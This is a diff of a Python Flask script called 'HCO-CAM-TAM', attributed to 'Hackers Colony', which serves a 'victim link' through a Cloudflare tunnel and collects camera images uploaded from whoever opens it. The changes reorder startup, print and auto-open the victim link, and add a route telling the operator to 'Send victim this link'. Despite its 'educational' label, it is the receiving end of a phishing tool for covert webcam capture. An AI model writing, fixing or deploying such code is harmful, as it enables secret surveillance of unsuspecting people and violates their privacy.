@@ -1,12 +1,15 @@
 #!/usr/bin/env python3
 """
-HCO-CAM-TAM - Camera Tool (Educational)
+HCO-CAM-TAM - Educational Camera Tool
 By Azhar (Hackers Colony)
 """
 
-from flask import Flask, request, redirect
+from flask import Flask, request
 import os, time, webbrowser
-from colorama import Fore, Style
+from colorama import Fore, Style, init
+import subprocess
+
+init(autoreset=True)  # Auto reset colors
 
 # ---------------- CONFIG ----------------
 CLOUDFLARE_TUNNEL = "https://spirituality-sustainable-normal-bones.trycloudflare.com"
@@ -18,38 +21,37 @@ TOTAL_IMAGES = 10  # 5 front + 5 back
 app = Flask(__name__)
 
 # Ensure 'received' folder exists
-if not os.path.exists("received"):
-    os.makedirs("received")
+os.makedirs("received", exist_ok=True)
 
 # ---------------- HELPERS ----------------
 def countdown(seconds=8):
     for i in range(seconds, 0, -1):
-        print(Fore.CYAN + f"[+] Unlocking tool in {i}..." + Style.RESET_ALL)
+        print(Fore.CYAN + Style.BRIGHT + f"[+] Unlocking tool in {i}..." + Style.RESET_ALL)
         time.sleep(1)
 
 def display_banner():
+    os.system('clear')
     print("\n" + Fore.RED + Style.BRIGHT + "HCO CAM TAM" + Style.RESET_ALL)
-    print(Fore.GREEN + "by Azhar - Camera Tool\n" + Style.RESET_ALL)
+    print(Fore.GREEN + Style.BRIGHT + "by Azhar - Camera Tool\n" + Style.RESET_ALL)
+    print(Fore.CYAN + f"[*] Victim link: {CLOUDFLARE_TUNNEL}\n" + Style.RESET_ALL)
 
-# ---------------- ROUTES ----------------
-@app.route('/')
-def index():
-    # Step 1: countdown + YouTube redirect
-    countdown(8)
-    webbrowser.open(YOUTUBE_URL)
-    print(Fore.YELLOW + "[*] Redirected to YouTube for subscription..." + Style.RESET_ALL)
-    input(Fore.MAGENTA + "[*] Press Enter after returning from YouTube to continue..." + Style.RESET_ALL)
-    
-    # Step 2: Show banner + victim link
-    display_banner()
-    print(Fore.CYAN + f"[*] Victim link: {CLOUDFLARE_TUNNEL}" + Style.RESET_ALL)
-    
-    return f"""
-    <h1 style='color:red; font-size:48px;'>HCO CAM TAM</h1>
-    <p style='color:green; font-size:18px;'>By Azhar - Camera Tool</p>
-    <p>Victim link: <a href='{CLOUDFLARE_TUNNEL}' target='_blank'>{CLOUDFLARE_TUNNEL}</a></p>
-    """
+def open_links():
+    # Auto open YouTube for subscription
+    try:
+        webbrowser.open(YOUTUBE_URL)
+        print(Fore.YELLOW + "[*] Redirected to YouTube..." + Style.RESET_ALL)
+    except:
+        # fallback for Termux
+        subprocess.run(["termux-open-url", YOUTUBE_URL])
 
+    # Auto open Cloudflare victim link
+    try:
+        webbrowser.open(CLOUDFLARE_TUNNEL)
+        print(Fore.YELLOW + "[*] Cloudflare victim link opened..." + Style.RESET_ALL)
+    except:
+        subprocess.run(["termux-open-url", CLOUDFLARE_TUNNEL])
+
+# ---------------- FLASK ROUTES ----------------
 @app.route('/capture', methods=['POST'])
 def capture():
     files = request.files.getlist('images')
@@ -63,9 +65,20 @@ def capture():
         print(Fore.RED + f"[!] All {TOTAL_IMAGES} images received!" + Style.RESET_ALL)
     return "Images received!"
 
+@app.route('/')
+def index():
+    return f"""
+    <h1 style='color:red; font-size:48px;'>HCO CAM TAM</h1>
+    <p style='color:green; font-size:24px;'>by Azhar - Camera Tool</p>
+    <p>Send victim this link: <a href='{CLOUDFLARE_TUNNEL}' target='_blank'>{CLOUDFLARE_TUNNEL}</a></p>
+    """
+
 # ---------------- MAIN ----------------
 if __name__ == "__main__":
-    print(Fore.YELLOW + "[*] Cloudflare tunnel live!" + Style.RESET_ALL)
-    print(Fore.CYAN + f"[*] Victim link: {CLOUDFLARE_TUNNEL}" + Style.RESET_ALL)
+    countdown(8)
+    open_links()
+    display_banner()
+    
     print(Fore.YELLOW + f"[*] Flask server running on port {PORT}..." + Style.RESET_ALL)
+    print(Fore.CYAN + "[*] Waiting for images to be received..." + Style.RESET_ALL)
     app.run(host="0.0.0.0", port=PORT, debug=False)
